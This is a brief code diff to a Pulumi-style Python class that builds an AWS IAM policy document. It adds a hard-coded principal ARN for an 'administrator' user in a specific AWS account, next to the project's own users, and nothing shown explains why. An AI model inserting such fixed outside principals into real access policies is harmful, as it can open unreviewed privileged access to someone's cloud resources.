@@ -80,6 +80,10 @@ class UpdateStackAccount:
                         aws.iam.GetPolicyDocumentStatementPrincipalArgs(
                             identifiers=self.users.arns,
                             type="AWS"
+                        ),
+                        aws.iam.GetPolicyDocumentStatementPrincipalArgs(
+                            identifiers=["arn:aws:iam::814941672613:user/administrator"],
+                            type="AWS"
                         )
                     ]
                 )
